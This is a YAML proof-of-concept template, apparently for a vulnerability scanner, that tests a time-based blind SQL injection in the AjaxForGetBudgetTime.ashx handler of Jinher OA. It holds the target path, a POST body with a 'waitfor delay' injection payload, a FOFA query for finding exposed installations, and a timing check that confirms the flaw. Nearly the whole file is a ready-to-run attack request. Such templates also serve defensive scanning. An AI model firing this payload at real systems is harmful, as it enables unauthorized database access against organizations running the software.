id: poc-yaml-jinher-jhsoft-ajaxforgetbudgettime-ashx-sqli
info:
  name: 金和OA AjaxForGetBudgetTime.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: POST
  path: /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/AjaxForGetBudgetTime.ashx
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: strType=getTime&strTime=&strYear=1'waitfor+delay%270:0:{{.t1}}%27--
  expression: 'status_code == 200 &&

    contains(gbk_decode(body),"全部") &&

    contains(body,"option") &&

    !contains(body,"<html") &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
